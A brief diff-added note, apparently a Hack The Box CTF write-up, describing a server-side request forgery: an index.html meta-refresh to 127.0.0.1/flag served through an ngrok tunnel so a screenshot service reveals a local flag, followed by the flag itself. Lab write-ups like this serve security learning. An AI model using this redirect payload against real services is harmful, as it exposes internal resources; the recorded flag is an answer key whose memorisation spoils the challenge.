@@ -1,0 +1,13 @@
+access: http://138.68.148.72:30965/
+let's create index.html
+<meta http-equiv="refresh" content="0; URL=http://127.0.0.1/flag" />
+
+let's using ngrok for port binding
+input to url field:
+https://ed63-101-128-114-68.ngrok-free.app
+
+screenshot will deliver flag:
+HTB{reb1nd1ng_y0ur_dns_r3s0lv3r_0n3_qu3ry_4t_4_t1m3}
+
+resource:
+https://skelter.hashnode.dev/htb-baby-cachedview-writeup-alternative
